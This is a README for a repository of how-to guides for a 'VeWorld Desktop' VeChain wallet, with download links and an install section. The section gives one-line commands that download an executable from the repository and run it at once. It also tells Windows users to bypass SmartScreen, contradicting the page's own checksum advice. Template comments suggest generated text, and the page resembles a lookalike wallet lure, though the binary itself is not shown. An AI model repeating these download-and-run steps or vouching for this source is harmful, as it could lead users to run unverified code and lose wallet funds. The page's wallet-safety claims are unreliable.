![VeWorld Desktop](assets/banner-hub.png)

# VeWorld Desktop how-to guides

Install, create, import, recover and judge a download, in the order these tasks actually fail.

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4"><img src="assets/badge-release.svg" alt="Release v2.2.4"></a></p>

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

> Every guide here assumes the current release; run it before treating a display problem as a wallet fault.

## What this repository is for
This repository answers the questions that arrive after someone decides to install a desktop wallet rather than keep using a browser extension or an older application. Each guide takes one task - install on Windows, create a wallet, import a keystore, recover access, read a balance - and works it through to the point where the reader either has a result or knows which fact is missing.

The order of the guide matters more than its length. A restore that lands on an empty address is usually a derivation path question, not a phrase question; a send that is refused is usually a fee question, not a balance question; a download that looks wrong is a checksum question, not a design question. Each page names the distinction first because that is where readers lose time.

Nothing here asks you to type a recovery phrase anywhere except into the application's own restore screen, and no page promises a repair that the current release has not shipped. Where a claim depends on something nobody in the writing process observed - a screen label, a specific prompt, a version - the page says so and gives the check the reader can run instead.

## Who it is for
- People installing a VeChain wallet on a desktop for the first time and unsure what the first run should look like.
- Readers arriving from Sync2 or the older VeChain mobile wallet with a keystore file or a written phrase.
- Anyone locked out by a password, an unlock gate or an update that changed how the app stores its keys.
- People deciding whether a download, a support message or a wallet site can be trusted at all.

## Start here
- [install VeWorld Desktop on Windows](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-windows-wallet-veworld-desktop.md) - Install it on Windows, get past antivirus quarantine and folder permissions, and confirm the data survives a restart.
- [what VeWorld Desktop is](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/what-is-veworld-desktop.md) - The desktop wallet, its three platforms, and the different product that shares most of its name.
- [recover a forgotten password](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md) - There is no reset link; restoring from the phrase rebuilds the address and sets a new password.
- [a balance that reads zero](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/check-vechain-balance-zero-in-veworld-desktop.md) - A zero balance is usually a different address, account index or network rather than lost funds.

## How to use these guides
1. Install the current release and compare the checksum before the first run.
2. Create a wallet or import an existing one, then write the phrase on paper before funding anything.
3. If a screen looks wrong, read the guide for that exact symptom rather than the nearest topic.
4. Check the account and the network before concluding that a balance is missing.
5. Run the current release before reporting a flow that stalls, and note the version you were running.

## The guides

- [what VeWorld Desktop is](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/what-is-veworld-desktop.md) - The desktop wallet, its three platforms, and the different product that shares most of its name.
- [whether VeWorld Desktop is safe](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/is-veworld-wallet-safe-in-veworld-desktop.md) - What self-custody protects here, what it leaves entirely to you, and why no audit claim is made.
- [spot a fake wallet site](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/fake-crypto-wallet-app-vs-veworld-desktop.md) - Tell a lookalike download page from the published build using the domain and the checksum, not the design.
- [move from the older VeChain wallet](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-thor-wallet-to-veworld-desktop.md) - Move from the older VeChain mobile wallet by importing the phrase, not by sending a balance across.
- [leave Sync2 for the desktop wallet](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/how-to-send-vtho-from-sync-wallet-to-veworld-desktop.md) - Import a Sync2 keystore with its password and read the same address without the old application installed.
- [syncing the official wallet and this one](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-wallet-sync-in-veworld-desktop.md) - Whether the official VeChain wallet and this one can be synced directly, or whether the phrase is the only bridge between them.
- [the password and the phrase](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/veworld-login-password-and-phrase-veworld-desktop.md) - Two credentials with two jobs: the local password unlocks the machine, and the phrase restores the account.
- [recover a forgotten password](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md) - There is no reset link; restoring from the phrase rebuilds the address and sets a new password.
- [an unlock screen that loops](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-wallet-password-pin-screen-veworld-desktop.md) - An unlock gate that keeps returning your own password after an update, and the route past it.
- [a stalled backup or upgrade](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/backup-vechain-thor-wallet-veworld-desktop.md) - When a backup or upgrade screen stalls, the phrase you wrote at setup is the way through.
- [a blank create screen](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/create-vechain-wallet-blank-in-veworld-desktop.md) - If the create screen stays empty while import completes, generation failed in that build rather than in your machine.
- [a balance that reads zero](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/check-vechain-balance-zero-in-veworld-desktop.md) - A zero balance is usually a different address, account index or network rather than lost funds.
- [exchange custody or a device](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-hardware-wallet-or-exchange-veworld-desktop.md) - What custody means in practice, and who can move a balance without involving you.
- [install VeWorld Desktop on Windows](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-windows-wallet-veworld-desktop.md) - Install it on Windows, get past antivirus quarantine and folder permissions, and confirm the data survives a restart.
- [biometric unlock explained](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/biometric-crypto-wallet-unlock-in-veworld-desktop.md) - What a biometric unlock actually does on a device, and what this desktop build asks for instead.
- [locking an idle wallet](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-wallet-security-app-lock-veworld-desktop.md) - Keeping an unlocked session off the desk, and what someone at that keyboard can do with it.
- [moving an account between apps](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-keystore-export-veworld-desktop.md) - The phrase is the portable credential; treat any exported file as a second copy you have to protect.
- [which VeChain wallet to use](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/which-vechain-wallet-veworld-desktop.md) - Four wallet options compared on form, hardware signing, and the kind of work each is built for.

## What each guide changes
| Task | Guide | Outcome |
| --- | --- | --- |
| Install on a desktop | [install VeWorld Desktop on Windows](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-windows-wallet-veworld-desktop.md) | A first run that survives quarantine and folder permissions |
| Recover a locked wallet | [recover a forgotten password](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md) | The same address restored, with a new local password |
| Import an older account | [leave Sync2 for the desktop wallet](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/how-to-send-vtho-from-sync-wallet-to-veworld-desktop.md) | One address read by a maintained application |
| Judge a download | [spot a fake wallet site](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/fake-crypto-wallet-app-vs-veworld-desktop.md) | A decision made on the domain and the checksum |
| Diagnose a zero balance | [a balance that reads zero](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/check-vechain-balance-zero-in-veworld-desktop.md) | Address, index and network checked in that order |
| Understand custody | [exchange custody or a device](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-hardware-wallet-or-exchange-veworld-desktop.md) | A clear answer to who can move the balance |

## Common first questions

### Does this repository replace the wallet's own documentation?
It complements it. The guides explain the tasks and failure states in more detail than a product page, while the release notes describe what each build contains.

### Can I follow a guide on an older build?
Some steps will not match, because unlock handling and import flow change between releases. Run the current release first, then follow the guide for the symptom you still see.

### Why do the guides keep repeating the phrase warning?
Because every recovery route in this class of wallet ends at the phrase, and almost every loss begins with it being typed somewhere else. The repetition is deliberate.

### Are the guides safe to follow on a shared computer?
Follow them, but close the wallet afterwards and use a separate operating-system account. A shared profile shares the wallet's data directory, which no setting removes.

### Which guide should I read first?
Start with the install or import guide for your platform, then the password guide. Everything else assumes the wallet is already running and the account is already the one you expect.


## Before you install
- A machine you control, with disk encryption and a screen lock enabled.
- Somewhere physical to write the recovery phrase, decided before the wallet exists.
- The address you expect to see if you are importing rather than creating.
- The current release, downloaded from the release page rather than a search result.

## About and license
VeWorld Desktop how-to guides is part of the VeWorld Desktop pack: guides for a self-custody wallet on the VeChainThor network, published for Windows, macOS and Linux. The application is actively maintained and each release ships with its notes and checksums. This repository carries no licence file, so none is claimed here.


## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->